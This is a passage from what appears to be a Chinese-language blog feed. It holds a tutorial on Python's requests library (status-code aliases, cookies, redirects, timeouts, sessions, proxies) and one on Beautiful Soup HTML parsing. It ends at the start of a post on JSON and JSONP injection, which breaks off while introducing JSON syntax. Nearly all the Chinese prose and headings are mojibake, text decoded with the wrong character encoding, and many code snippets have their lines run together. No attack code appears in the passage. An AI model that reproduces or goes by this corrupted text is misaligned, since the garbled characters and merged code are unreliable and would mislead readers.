&#x27;resume&#x27;,), # These 2 to be removed in 3.0Client Error.<span class="hljs-attribute">400</span>: (&#x27;bad_request&#x27;, &#x27;bad&#x27;),<span class="hljs-attribute">401</span>: (&#x27;unauthorized&#x27;,),<span class="hljs-attribute">402</span>: (&#x27;payment_required&#x27;, &#x27;payment&#x27;),<span class="hljs-attribute">403</span>: (&#x27;forbidden&#x27;,),<span class="hljs-attribute">404</span>: (&#x27;not_found&#x27;, &#x27;-o-&#x27;),<span class="hljs-attribute">405</span>: (&#x27;method_not_allowed&#x27;, &#x27;not_allowed&#x27;),<span class="hljs-attribute">406</span>: (&#x27;not_acceptable&#x27;,),<span class="hljs-attribute">407</span>: (&#x27;proxy_authentication_required&#x27;, &#x27;proxy_auth&#x27;, &#x27;proxy_authentication&#x27;),<span class="hljs-attribute">408</span>: (&#x27;request_timeout&#x27;, &#x27;timeout&#x27;),<span class="hljs-attribute">409</span>: (&#x27;conflict&#x27;,),<span class="hljs-attribute">410</span>: (&#x27;gone&#x27;,),<span class="hljs-attribute">411</span>: (&#x27;length_required&#x27;,),<span class="hljs-attribute">412</span>: (&#x27;precondition_failed&#x27;, &#x27;precondition&#x27;),<span class="hljs-attribute">413</span>: (&#x27;request_entity_too_large&#x27;,),<span class="hljs-attribute">414</span>: (&#x27;request_uri_too_large&#x27;,),<span class="hljs-attribute">415</span>: (&#x27;unsupported_media_type&#x27;, &#x27;unsupported_media&#x27;, &#x27;media_type&#x27;),<span class="hljs-attribute">416</span>: (&#x27;requested_range_not_satisfiable&#x27;, &#x27;requested_range&#x27;, &#x27;range_not_satisfiable&#x27;),<span class="hljs-attribute">417</span>: (&#x27;expectation_failed&#x27;,),<span class="hljs-attribute">418</span>: (&#x27;im_a_teapot&#x27;, &#x27;teapot&#x27;, &#x27;i_am_a_teapot&#x27;),<span class="hljs-attribute">421</span>: (&#x27;misdirected_request&#x27;,),<span class="hljs-attribute">422</span>: (&#x27;unprocessable_entity&#x27;, &#x27;unprocessable&#x27;),<span class="hljs-attribute">423</span>: (&#x27;locked&#x27;,),<span class="hljs-attribute">424</span>: (&#x27;failed_dependency&#x27;, &#x27;dependency&#x27;),<span class="hljs-attribute">425</span>: (&#x27;unordered_collection&#x27;, &#x27;unordered&#x27;),<span class="hljs-attribute">426</span>: (&#x27;upgrade_required&#x27;, &#x27;upgrade&#x27;),<span class="hljs-attribute">428</span>: (&#x27;precondition_required&#x27;, &#x27;precondition&#x27;),<span class="hljs-attribute">429</span>: (&#x27;too_many_requests&#x27;, &#x27;too_many&#x27;),<span class="hljs-attribute">431</span>: (&#x27;header_fields_too_large&#x27;, &#x27;fields_too_large&#x27;),<span class="hljs-attribute">444</span>: (&#x27;no_response&#x27;, &#x27;none&#x27;),<span class="hljs-attribute">449</span>: (&#x27;retry_with&#x27;, &#x27;retry&#x27;),<span class="hljs-attribute">450</span>: (&#x27;blocked_by_windows_parental_controls&#x27;, &#x27;parental_controls&#x27;),<span class="hljs-attribute">451</span>: (&#x27;unavailable_for_legal_reasons&#x27;, &#x27;legal_reasons&#x27;),<span class="hljs-attribute">499</span>: (&#x27;client_closed_request&#x27;,),Server Error.<span class="hljs-attribute">500</span>: (&#x27;internal_server_error&#x27;, &#x27;server_error&#x27;, &#x27;/o\&#x27;, &#x27;âœ—&#x27;),<span class="hljs-attribute">501</span>: (&#x27;not_implemented&#x27;,),<span class="hljs-attribute">502</span>: (&#x27;bad_gateway&#x27;,),<span class="hljs-attribute">503</span>: (&#x27;service_unavailable&#x27;, &#x27;unavailable&#x27;),<span class="hljs-attribute">504</span>: (&#x27;gateway_timeout&#x27;,),<span class="hljs-attribute">505</span>: (&#x27;http_version_not_supported&#x27;, &#x27;http_version&#x27;),<span class="hljs-attribute">506</span>: (&#x27;variant_also_negotiates&#x27;,),<span class="hljs-attribute">507</span>: (&#x27;insufficient_storage&#x27;,),<span class="hljs-attribute">509</span>: (&#x27;bandwidth_limit_exceeded&#x27;, &#x27;bandwidth&#x27;),<span class="hljs-attribute">510</span>: (&#x27;not_extended&#x27;,),<span class="hljs-attribute">511</span>: (&#x27;network_authentication_required&#x27;, &#x27;network_auth&#x27;, &#x27;network_authentication&#x27;),</code></pre><p>æŠ¥é”™å®¶æ—âŒâŒâŒ</p><h4 id="cookie"><a class="header-anchor" href="#cookie">ğŸ­</a>cookie</h4><pre><code class="hljs awk">r.cookies[<span class="hljs-string">&#x27;example_cookie_name&#x27;</span>]<span class="hljs-regexp">//</span>è®¿é—®å“åº”ä¸­çš„cookie</code></pre><h4 id="é‡å®šå‘ä¸è¯·æ±‚å†å²"><a class="header-anchor" href="#é‡å®šå‘ä¸è¯·æ±‚å†å²">ğŸ­</a>é‡å®šå‘ä¸è¯·æ±‚å†å²</h4><pre><code class="hljs awk">r.history<span class="hljs-regexp">//</span>è¿½è¸ªé‡å®šå‘</code></pre><p>ç¦ç”¨é‡å®šå‘ï¼š</p><pre><code class="hljs routeros">r = requests.<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-attribute">allow_redirects</span>=<span class="hljs-literal">False</span>)</code></pre><h4 id="è¶…æ—¶"><a class="header-anchor" href="#è¶…æ—¶">ğŸ­</a>è¶…æ—¶</h4><pre><code class="hljs routeros">requests.<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-attribute">timeout</span>=0.001)// timeout å‚æ•°è®¾å®šçš„ç§’æ•°æ—¶é—´ä¹‹ååœæ­¢ç­‰å¾…å“åº”</code></pre><h4 id="ä¼šè¯å¯¹è±¡"><a class="header-anchor" href="#ä¼šè¯å¯¹è±¡">ğŸ­</a>ä¼šè¯å¯¹è±¡</h4><p>è·¨è¯·æ±‚ä¿æŒæŸäº›å‚æ•°,ä¼šåœ¨åŒä¸€ä¸ªsessionå®ä¾‹å‘å‡ºçš„æ‰€æœ‰è¯·æ±‚ä¹‹é—´ä¿æŒcookie</p><p>è·¨è¯·æ±‚ä¿æŒä¸€äº› cookie:</p><pre><code class="hljs routeros">s = requests.Session()s.<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&#x27;http://httpbin.org/cookies/set/sessioncookie/123456789&#x27;</span>)r = s.<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&quot;http://httpbin.org/cookies&quot;</span>)</code></pre><h4 id="ä»£ç†"><a class="header-anchor" href="#ä»£ç†">ğŸ­</a>ä»£ç†</h4><pre><code class="hljs routeros">import requestsproxies = &#123;  <span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&quot;http://10.10.1.10:3128&quot;</span>,  <span class="hljs-string">&quot;https&quot;</span>: <span class="hljs-string">&quot;http://10.10.1.10:1080&quot;</span>,&#125;requests.<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&quot;http://example.org&quot;</span>, <span class="hljs-attribute">proxies</span>=proxies)</code></pre><p>or</p><p>ç¼–è¾‘ç¯å¢ƒå˜é‡:</p><pre><code class="hljs routeros">$ <span class="hljs-builtin-name">export</span> <span class="hljs-attribute">HTTP_PROXY</span>=<span class="hljs-string">&quot;http://10.10.1.10:3128&quot;</span>$ <span class="hljs-builtin-name">export</span> <span class="hljs-attribute">HTTPS_PROXY</span>=<span class="hljs-string">&quot;http://10.10.1.10:1080&quot;</span></code></pre><h2 id="Beautiful-Soupè§£æåº“"><a class="header-anchor" href="#Beautiful-Soupè§£æåº“">ğŸ­</a>Beautiful Soupè§£æåº“</h2><p>pythonçš„ä¸€ä¸ªHTMLæˆ–XMLçš„è§£æåº“ï¼Œå¯ä»ç½‘é¡µä¸­æå–æ•°æ®ï¼Œå®ƒæ‹¥æœ‰å¼ºå¤§çš„APIå’Œå¤šæ ·çš„è§£ææ–¹å¼ã€‚</p><p>ç‰¹ç‚¹ï¼š</p><ul><li>æä¾›ä¸€äº›ç®€å•çš„æ–¹æ³•å’Œpythonå¼å‡½æ•°ï¼Œç”¨äºæµè§ˆï¼Œæœç´¢å’Œä¿®æ”¹è§£ææ ‘ï¼Œé€šè¿‡è§£ææ–‡æ¡£ä¸ºç”¨æˆ·æä¾›éœ€è¦æŠ“å–çš„æ•°æ®</li><li>è‡ªåŠ¨å°†è½¬å…¥ç¨³å®šè½¬æ¢ä¸ºUnicodeç¼–ç ï¼Œè¾“å‡ºæ–‡æ¡£è½¬æ¢ä¸ºUTF-8ç¼–ç </li><li>Beautiful Soupä½äºæµè¡Œçš„Pythonè§£æå™¨ï¼ˆå¦‚<code>lxml</code>å’Œ<code>html5lib</code>ï¼‰ä¹‹ä¸Šï¼Œå…è®¸å°è¯•ä¸åŒçš„è§£æç­–ç•¥æˆ–äº¤æ˜“é€Ÿåº¦ä»¥è·å¾—çµæ´»æ€§ã€‚</li></ul><p>Beautiful Soupç±»çš„åŸºæœ¬å…ƒç´ ï¼š</p><p>1ã€Tagâ€”â€”æ ‡ç­¾ï¼Œæœ€åŸºæœ¬çš„ä¿¡æ¯ç»„ç»‡å•å…ƒï¼Œåˆ†åˆ«ç”¨&lt;&gt;å’Œ&lt;/&gt;è¡¨æ˜å¼€å¤´å’Œç»“å°¾</p><p>2ã€Nameâ€”â€”æ ‡ç­¾çš„åå­—ï¼Œ<code>&lt;p&gt;...&lt;/p&gt;</code>çš„åå­—æ˜¯â€™pâ€™,æ ¼å¼ï¼š<code>&lt;tag&gt;.name</code></p><p>3ã€Attributesâ€”â€”æ ‡ç­¾çš„å±æ€§ï¼Œå­—å…¸å½¢å¼ç»„ç»‡ï¼Œæ ¼å¼ï¼š<code>&lt;tag&gt;.attrs</code></p><p>4ã€NavigableStringâ€”â€”æ ‡ç­¾å†…éå±æ€§å­—ç¬¦ä¸²ï¼Œ<code>&lt;&gt;...&lt;/&gt;</code>ä¸­çš„å­—ç¬¦ä¸²ï¼Œæ ¼å¼ï¼š<code>&lt;tag&gt;.string</code></p><p>5ã€Commentâ€”â€”æ ‡ç­¾å†…å­—ç¬¦ä¸²çš„æ³¨é‡Šéƒ¨åˆ†ï¼Œä¸€ç§ç‰¹æ®Šçš„Commentç±»å‹ï¼ˆ<strong>å°–æ‹¬å·å¹å·è¡¨ç¤ºæ³¨é‡Šå¼€å§‹</strong>ï¼š<code>&lt;!--This is a commet--&gt;</code>ï¼‰</p><p>ç”¨æ³•:</p><p>é€šè¿‡ä¼ å…¥ä¸€æ®µå­—ç¬¦æˆ–ä¸€ä¸ªæ–‡ä»¶å¥æŸ„ï¼ŒBeautifulSoupçš„æ„é€ æ–¹æ³•å¾—åˆ°ä¸€ä¸ªæ–‡æ¡£çš„å¯¹è±¡ï¼Œé€‰æ‹©åˆé€‚çš„è§£æå™¨æ¥è§£ææ–‡æ¡£ï¼Œå¯æ‰‹åŠ¨æŒ‡å®šå°†é€‰æ‹©æŒ‡å®šçš„è§£æå™¨æ¥è§£ææ–‡æ¡£,Beautiful  Soupå°†å¤æ‚çš„HTMLæ–‡æ¡£è½¬æ¢æˆä¸€ä¸ªå¤æ‚çš„æ ‘å½¢ç»“æ„ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½æ˜¯pythonå¯¹è±¡ï¼Œæ‰€æœ‰å¯¹è±¡å¯ä»¥å½’çº³ä¸º4ç§ï¼šTagã€NavigableStringã€BeautifulSoupã€Comment</p><p><img src="/2021/02/19/Soup4/1.png" alt="1"></p><h3 id="èŠ‚ç‚¹é€‰æ‹©å™¨"><a class="header-anchor" href="#èŠ‚ç‚¹é€‰æ‹©å™¨">ğŸ­</a>èŠ‚ç‚¹é€‰æ‹©å™¨()</h3><h4 id="é€‰æ‹©å…ƒç´ "><a class="header-anchor" href="#é€‰æ‹©å…ƒç´ ">ğŸ­</a>é€‰æ‹©å…ƒç´ </h4><pre><code class="hljs awk">soup.head<span class="hljs-regexp">//</span>è·å–headæ ‡ç­¾soup.p.b<span class="hljs-regexp">//</span>è·å–pèŠ‚ç‚¹ä¸‹çš„bèŠ‚ç‚¹soup.p.string<span class="hljs-regexp">//</span>è·å–ç¬¬ä¸€ä¸ªpèŠ‚ç‚¹ä¸‹çš„æ–‡æœ¬soup.head.title.string<span class="hljs-regexp">//</span>åµŒå¥—é€‰æ‹©</code></pre><h4 id="è·å–åç§°"><a class="header-anchor" href="#è·å–åç§°">ğŸ­</a>è·å–åç§°</h4><pre><code class="hljs css"><span class="hljs-selector-tag">soup</span><span class="hljs-selector-class">.body</span><span class="hljs-selector-class">.name</span></code></pre><h4 id="è·å–èŠ‚ç‚¹å±æ€§"><a class="header-anchor" href="#è·å–èŠ‚ç‚¹å±æ€§">ğŸ­</a>è·å–èŠ‚ç‚¹å±æ€§</h4><pre><code class="hljs stylus">soup<span class="hljs-selector-class">.p</span><span class="hljs-selector-class">.attrs</span>    <span class="hljs-comment">//è·å–pèŠ‚ç‚¹æ‰€æœ‰å±æ€§</span>soup<span class="hljs-selector-class">.p</span><span class="hljs-selector-class">.attrs</span>[<span class="hljs-string">&#x27;class&#x27;</span>]  <span class="hljs-comment">//è·å–pèŠ‚ç‚¹classå±æ€§</span>soup<span class="hljs-selector-class">.p</span>[<span class="hljs-string">&#x27;class&#x27;</span>]  <span class="hljs-comment">//ä»¥å­—å…¸å½¢å¼ç›´æ¥è·å–pèŠ‚ç‚¹classå±æ€§</span></code></pre><h4 id="è·å–å†…å®¹"><a class="header-anchor" href="#è·å–å†…å®¹">ğŸ­</a>è·å–å†…å®¹</h4><pre><code class="hljs livecodeserver">soup.p.<span class="hljs-keyword">string</span><span class="hljs-comment"> //è·å–ç¬¬ä¸€ä¸ªpèŠ‚ç‚¹ä¸‹çš„æ–‡æœ¬</span>soup.<span class="hljs-keyword">a</span>.next_element||soup.<span class="hljs-keyword">a</span>.previous_elemen<span class="hljs-comment">t//è·å–ä¸Šä¸€ä¸ªæˆ–ä¸‹ä¸€ä¸ªè¢«è§£æçš„å¯¹è±¡</span>soup.<span class="hljs-keyword">a</span>.next_elements||soup.<span class="hljs-keyword">a</span>.previous_element<span class="hljs-comment">s//è¿­ä»£å™¨å‘å‰æˆ–è€…åè®¿é—®æ–‡æ¡£è§£æå†…å®¹</span></code></pre><h4 id="å­èŠ‚ç‚¹å’Œå­å­™èŠ‚ç‚¹"><a class="header-anchor" href="#å­èŠ‚ç‚¹å’Œå­å­™èŠ‚ç‚¹">ğŸ­</a>å­èŠ‚ç‚¹å’Œå­å­™èŠ‚ç‚¹</h4><pre><code class="hljs awk">soup.p.contents<span class="hljs-regexp">//</span>è·å–ç›´æ¥å­èŠ‚ç‚¹ä»¥åˆ—è¡¨å½¢å¼è¿”å›å†…å®¹soup.p.children<span class="hljs-regexp">//</span>è·å–ç›´æ¥å­èŠ‚ç‚¹ä»¥ç”Ÿæˆå™¨çš„ç±»å‹è¿”å›soup.p.desccendants<span class="hljs-regexp">//</span>è·å–å­å­™èŠ‚ç‚¹ï¼Œè¿”å›ç”Ÿæˆå™¨</code></pre><h4 id="çˆ¶èŠ‚ç‚¹å’Œç¥–å…ˆèŠ‚ç‚¹"><a class="header-anchor" href="#çˆ¶èŠ‚ç‚¹å’Œç¥–å…ˆèŠ‚ç‚¹">ğŸ­</a>çˆ¶èŠ‚ç‚¹å’Œç¥–å…ˆèŠ‚ç‚¹</h4><pre><code class="hljs awk">soup.b.parent<span class="hljs-regexp">//</span>è·å–çˆ¶èŠ‚ç‚¹è¿”å›ç”Ÿæˆå™¨soup.b.parents<span class="hljs-regexp">//</span>è·å–ç¥–å…ˆèŠ‚ç‚¹ï¼Œè¿”å›ç”Ÿæˆå™¨</code></pre><h4 id="å…„å¼ŸèŠ‚ç‚¹"><a class="header-anchor" href="#å…„å¼ŸèŠ‚ç‚¹">ğŸ­</a>å…„å¼ŸèŠ‚ç‚¹</h4><pre><code class="hljs awk">soup.a.next_siblings<span class="hljs-regexp">//</span>è¿”å›ä¸‹ä¸€ä¸ªå…„å¼ŸèŠ‚ç‚¹soup.a.previous_siblings<span class="hljs-regexp">//</span>è¿”å›ä¸Šä¸€ä¸ªå…„å¼ŸèŠ‚ç‚¹soup.a.next_siblings<span class="hljs-regexp">//</span>è¿”å›å‰é¢å’Œåé¢çš„æ‰€æœ‰å…„å¼ŸèŠ‚ç‚¹soup.a.previous_siblings<span class="hljs-regexp">//</span>è¿”å›ç”Ÿæˆå™¨</code></pre><p><em>æ¢è¡Œç¬¦ä¹Ÿæ˜¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ‰€ä»¥æœ‰æ—¶å€™åœ¨è·å–å…„å¼ŸèŠ‚ç‚¹æ˜¯é€šå¸¸æ˜¯å­—ç¬¦ä¸²æˆ–è€…ç©ºç™½</em></p><h3 id="æ–¹æ³•é€‰æ‹©å™¨"><a class="header-anchor" href="#æ–¹æ³•é€‰æ‹©å™¨">ğŸ­</a>æ–¹æ³•é€‰æ‹©å™¨</h3><p>èŠ‚ç‚¹é€‰æ‹©å™¨é€šè¿‡èŠ‚ç‚¹å±æ€§æ¥é€‰æ‹©ï¼Œè™½ç„¶å¿«ï¼Œä½†è¿›è¡Œæ¯”è¾ƒå¤æ‚çš„é€‰æ‹©æ—¶ä¸å¤Ÿçµæ´»ã€‚æ­¤æ—¶æˆ‘ä»¬å¯ä»¥å¼•ç”¨ä¸€äº›æŸ¥è¯¢æ–¹æ³•</p><blockquote><p>find_all(name,attrs,recursive,text,**kwargs)æŸ¥è¯¢æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„å…ƒç´ </p><blockquote><p>namå¯æŸ¥æ‰¾çš„æ‰€æœ‰åå­—ä¸ºnameçš„æ ‡ç­¾(è¿‡æ»¤å™¨ï¼Œæ­£åˆ™è¡¨è¾¾å¼ï¼Œåˆ—è¡¨â€¦â€¦ï¼‰</p><p>attrsè¡¨ç¤ºä¼ å…¥çš„å±æ€§ï¼Œä»¥å­—å…¸çš„å½¢å¼æŒ‡å®šå¦‚<code>id,attrs=&#123;'id':'123'&#125;</code>ï¼Œ(classå±æ€§æ˜¯pythonä¸­çš„å…³é”®å­—ï¼ŒæŸ¥è¯¢æ—¶éœ€è¦åœ¨classåé¢åŠ ä¸Šä¸‹åˆ’çº¿ï¼‰è¿”å›åˆ—è¡¨ã€‚</p><p>textåŒ¹é…èŠ‚ç‚¹çš„æ–‡æœ¬ï¼Œä¼ å…¥çš„å½¢å¼å¯ä»¥æ˜¯å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥æ˜¯æ­£åˆ™è¡¨è¾¾å¼å¯¹è±¡</p><p>recursiveï¼ˆåªæƒ³æœç´¢ç›´æ¥å­èŠ‚ç‚¹å¯ä»¥è®¾ç½®recursive=Flaseï¼‰</p><p>limitå‚æ•°ï¼Œé™åˆ¶è¿”å›ç»“æœçš„æ•°é‡</p></blockquote></blockquote><blockquote><p>find()ï¼šè¿”å›å•ä¸ªå…ƒç´ (ç¬¬ä¸€ä¸ªåŒ¹é…çš„å…ƒç´ )å‚æ•°åŒfind_all().</p></blockquote><p>ä»¥ä¸‹ç”¨æ³•ä¸èŠ‚ç‚¹é€‰æ‹©å™¨å¯¹åº”</p><ul><li><code>find_parents()</code></li><li><code>find_parent()</code></li><li><code>find_next_siblings( )</code></li><li><code>find_next_sibling( )</code></li><li><code>find_previous_siblings( )</code></li><li><code>find_previous_sibling()</code></li></ul><p><code>find_all_next( )</code>&amp;<code>find_next()</code>ï¼šå¯¹å½“å‰tagä¹‹åçš„tagå’Œå­—ç¬¦ä¸²è¿›è¡Œè¿­ä»£ï¼Œå‰è€…è¿”å›æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹ï¼Œåè€…è¿”å›ç¬¬ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹</p><p><code>find_all_previous()</code>å’Œ<code>find_previous()</code>ï¼šå¯¹å½“å‰tagä¹‹å‰çš„tagå’Œå­—ç¬¦ä¸²è¿›è¡Œè¿­ä»£ï¼Œå‰è€…è¿”å›èŠ‚ç‚¹åæ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹ï¼Œåè€…è¿”å›ç¬¬ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹</p><h3 id="CSSé€‰æ‹©å™¨"><a class="header-anchor" href="#CSSé€‰æ‹©å™¨">ğŸ­</a>CSSé€‰æ‹©å™¨</h3><p>åœ¨ Tag æˆ– BeautifulSoup å¯¹è±¡çš„ select()æ–¹æ³•ä¸­ä¼ å…¥å­—ç¬¦ä¸²å‚æ•°å³å¯ä½¿ç”¨CSSé€‰æ‹©å™¨çš„è¯­æ³•æ‰¾åˆ°tagï¼š</p><pre><code class="hljs dsconfig"><span class="hljs-string">soup.</span><span class="hljs-string">select(</span><span class="hljs-string">&#x27;.panel .panel-heading&#x27;</span>))//é€‰æ‹©<span class="hljs-string">class </span>ä¸º.<span class="hljs-string">panel </span>ä¸‹çš„<span class="hljs-string">class </span>ä¸º<span class="hljs-string">panel0headingçš„</span>æ ‡ç­¾<span class="hljs-string">soup.</span><span class="hljs-string">select(</span><span class="hljs-string">&#x27;ul li&#x27;</span>))//é€‰æ‹©æ ‡ç­¾<span class="hljs-string">ul </span>ä¸‹çš„<span class="hljs-string">liæ ‡</span>ç­¾<span class="hljs-string">soup.</span><span class="hljs-string">select(</span><span class="hljs-string">&#x27;#list-2 .element&#x27;</span>))//é€‰æ‹©<span class="hljs-string">idä¸º</span><span class="hljs-built_in">list-2</span> ä¸‹çš„<span class="hljs-string">classä¸º</span> <span class="hljs-string">elementæ ‡</span>ç­¾</code></pre><h4 id="è·å–å±æ€§"><a class="header-anchor" href="#è·å–å±æ€§">ğŸ­</a>è·å–å±æ€§</h4><pre><code class="hljs routeros"><span class="hljs-keyword">for</span> ul <span class="hljs-keyword">in</span> soup.select(<span class="hljs-string">&#x27;ul&#x27;</span>):    <span class="hljs-builtin-name">print</span>(ul[<span class="hljs-string">&#x27;id&#x27;</span>])    <span class="hljs-builtin-name">print</span>(ul.attrs[<span class="hljs-string">&#x27;id&#x27;</span>])</code></pre><h4 id="è·å–å†…å®¹-v2"><a class="header-anchor" href="#è·å–å†…å®¹-v2">ğŸ­</a>è·å–å†…å®¹</h4><pre><code class="hljs maxima"><span class="hljs-keyword">for</span> <span class="hljs-built_in">li</span> <span class="hljs-keyword">in</span> soup.select(&#x27;<span class="hljs-built_in">li</span>&#x27;):    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">li</span>.get_text())</code></pre><p>CSSæ›´å¤šå±æ€§è§ï¼š<a href="http://www.w3school.com.cn/cssref/css_selectors.asp">CSSé€‰æ‹©å™¨</a></p><h3 id="tagä¿®æ”¹"><a class="header-anchor" href="#tagä¿®æ”¹">ğŸ­</a>tagä¿®æ”¹</h3><p>Beautiful Soupå¯ä»¥æ”¹å˜tagæ ‡å¿—çš„å±æ€§çš„å€¼ï¼Œæ·»åŠ æˆ–åˆ é™¤å±æ€§å’Œå†…å®¹</p><pre><code class="hljs livecodeserver">markup=<span class="hljs-string">&#x27;&lt;a href=&quot;http://www.baidu.com/&quot;&gt;baidu&lt;/a&gt;&#x27;</span>soup=BeautifulSoup(markup,<span class="hljs-string">&#x27;lxml&#x27;</span>)soup.<span class="hljs-keyword">a</span>.<span class="hljs-keyword">string</span>=<span class="hljs-string">&#x27;ç™¾åº¦&#x27;</span>soup.<span class="hljs-keyword">a</span>&lt;<span class="hljs-keyword">a</span> href=<span class="hljs-string">&quot;http://www.baidu.com/&quot;</span>&gt;ç™¾åº¦&lt;/<span class="hljs-keyword">a</span>&gt;</code></pre><p>Tag.append() æ·»åŠ å†…å®¹,ä¸åˆ—è¡¨çš„ .append() æ–¹æ³•ç±»ä¼¼</p><pre><code class="hljs livecodeserver">soup.<span class="hljs-keyword">a</span>&lt;<span class="hljs-keyword">a</span> href=<span class="hljs-string">&quot;http://www.baidu.com/&quot;</span>&gt;ç™¾åº¦&lt;/<span class="hljs-keyword">a</span>&gt;soup.<span class="hljs-keyword">a</span>.append(<span class="hljs-string">&#x27;ä¸€ä¸‹&#x27;</span>)soup.<span class="hljs-keyword">a</span>&lt;<span class="hljs-keyword">a</span> href=<span class="hljs-string">&quot;http://www.baidu.com/&quot;</span>&gt;ç™¾åº¦ä¸€ä¸‹&lt;/<span class="hljs-keyword">a</span>&gt;</code></pre><p>è¿˜æœ‰å¾ˆå¤šï¼š</p><ul><li><code>new_tag()</code>æ–¹æ³•ç”¨äºåˆ›å»ºä¸€ä¸ªtagæ ‡ç­¾</li><li><code>insert()</code>å°†å…ƒç´ æ’å…¥åˆ°æŒ‡å®šçš„ä½ç½®</li><li><code>inert_before()</code>åœ¨å½“å‰tagæˆ–æ–‡æœ¬èŠ‚ç‚¹å‰æ’å…¥å†…å®¹</li><li><code>insert_after()</code>åœ¨å½“å‰tagæˆ–æ–‡æœ¬èŠ‚ç‚¹åæ’å…¥å†…å®¹</li><li><code>clear()</code>ç§»é™¤å½“å‰tagçš„å†…å®¹</li><li><code>extract()</code>å°†å½“å‰tagç§»é™¤æ–‡æ¡£æ•°ï¼Œå¹¶ä½œä¸ºæ–¹æ³•ç»“æœè¿”å›</li><li><code>prettify()</code>å°†Beautiful Soupçš„æ–‡æ¡£æ•°æ ¼å¼åŒ–åä»¥Unicodeç¼–ç è¾“å‡ºï¼ŒtagèŠ‚ç‚¹ä¹Ÿå¯ä»¥è°ƒç”¨</li><li><code>get_text()</code>è¾“å‡ºtagä¸­åŒ…å«çš„æ–‡æœ¬å†…å®¹ï¼ŒåŒ…æ‹¬å­å­™tagä¸­çš„å†…å®¹</li><li><code>soup.original_encoding</code> å±æ€§è®°å½•äº†è‡ªåŠ¨è¯†åˆ«çš„ç¼–ç ç»“æœ</li><li><code>from_encoding</code>:å‚æ•°åœ¨åˆ›å»ºBeautifulSoupå¯¹è±¡æ˜¯å¯ä»¥ç”¨æ¥æŒ‡å®šç¼–ç ï¼Œå‡å°‘çŒœæµ‹ç¼–ç çš„è¿è¡Œé€Ÿåº¦</li></ul><p>ç»“æŸ:ğŸ­ğŸ­ğŸ­</p><p>å‚è€ƒï¼š<a href="https://2.python-requests.org/zh_CN/latest/user/advanced.html#advanced">é«˜çº§ç”¨æ³• â€” Requests 2.18.1 æ–‡æ¡£</a></p><p><a href="https://2.python-requests.org/zh_CN/latest/user/quickstart.html">å¿«é€Ÿä¸Šæ‰‹ â€” Requests 2.18.1 æ–‡æ¡£</a></p><p><a href="https://www.cnblogs.com/zhangxinqi/p/9218395.html">python3è§£æåº“BeautifulSoup4</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>json &amp; jsonpæ³¨å…¥</title>
    <link href="/2021/02/19/jsonp/"/>
    <url>/2021/02/19/jsonp/</url>
    
    <content type="html"><![CDATA[<p>å…ˆæ¥ä»‹ç»ä¸€ä¸‹json</p><h1>json</h1><blockquote><p><code> JavaScript Object Notation</code>,JavaScript å¯¹è±¡è¡¨ç¤ºæ³•</p><blockquote><p>JSON æ˜¯å­˜å‚¨å’Œäº¤æ¢æ–‡æœ¬ä¿¡æ¯çš„è¯­æ³•ï¼Œç±»ä¼¼ XML<br>JSON ä½¿ç”¨ Javascriptè¯­æ³•æ¥æè¿°æ•°æ®å¯¹è±¡ï¼Œä½†å®ƒç‹¬ç«‹äºè¯­è¨€å’Œå¹³å°ã€‚<br>JSON è§£æå™¨å’Œ JSON åº“æ”¯æŒè®¸å¤šä¸åŒçš„ç¼–ç¨‹è¯­è¨€<br>JavaScript ç¨‹åºèƒ½å¤Ÿä½¿ç”¨å†…å»ºçš„ eval() å‡½æ•°ï¼Œç”¨ JSON æ•°æ®æ¥ç”ŸæˆåŸç”Ÿçš„ JavaScript å¯¹è±¡<br>é€šå¸¸ç”¨äºæœåŠ¡ç«¯å‘ç½‘é¡µä¼ é€’æ•°æ®</p><blockquote><p>JSON æ–‡ä»¶çš„æ–‡ä»¶ç±»å‹æ˜¯ <code> .json</code><br>JSON æ–‡æœ¬çš„ MIME ç±»å‹æ˜¯ <code>application/json</code></p></blockquote></blockquote></blockquote><h3 id="jsonè¯­æ³•è§„åˆ™"><a class="header-anchor" href="#jsonè¯­æ³•è§„åˆ™">ğŸ­</a>jsonè¯­æ³•è§„åˆ™</h3><blockquote><p>æ•°æ®ä¸º é”®/å€¼ å¯¹ã€‚<br>æ•°æ®ç”±é€—å·åˆ†éš”ã€‚<br>å¤§æ‹¬å·ä¿å­˜å¯¹è±¡<br>æ–¹æ‹¬å·ä¿å­˜æ•°ç»„<br>JSON ä¸èƒ½å­˜å‚¨ Date å¯¹è±¡(å¯ä»¥ä»¥å­—ç¬¦ä¸²ä¸ºä¸­ä»‹è¿›è¡Œè½¬æ¢ï¼Œå‡½æ•°ä¹Ÿä¸€æ ·)<br>JSON ä¸å…è®¸åŒ…å«å‡½æ•°</p><p><code>JSON.parse()</code>: å°†ä¸€ä¸ª JSON å­—ç¬¦ä¸²è½¬æ¢ä¸º JavaScript å¯¹è±¡ã€‚</p><blockquote><pre><code class="hljs css">&gt;<span class="hljs-selector-tag">JSON</span><span class="hljs-selector-class">.parse</span>(<span class="hljs-selector-tag">text</span><span class="hljs-selector-attr">[, reviver]</span>)</code></pre></blockquote></blockquote><blockquote><p><code>JSON.stringify()</code>: äºå°† JavaScript å€¼è½¬æ¢ä¸º JSON å­—ç¬¦ä¸²ã€‚</p><blockquote><pre><code class="hljs css">&gt;&gt;<span class="hljs-selector-tag">JSON</span><span class="hljs-selector-class">.stringify</span>(<span class="hljs-selector-tag">value</span><span class="hljs-selector-attr">[, replacer[, space]</span>])</code></pre></blockquote></blockquote><p>JSON è¯­æ³•æ˜¯ JavaScript 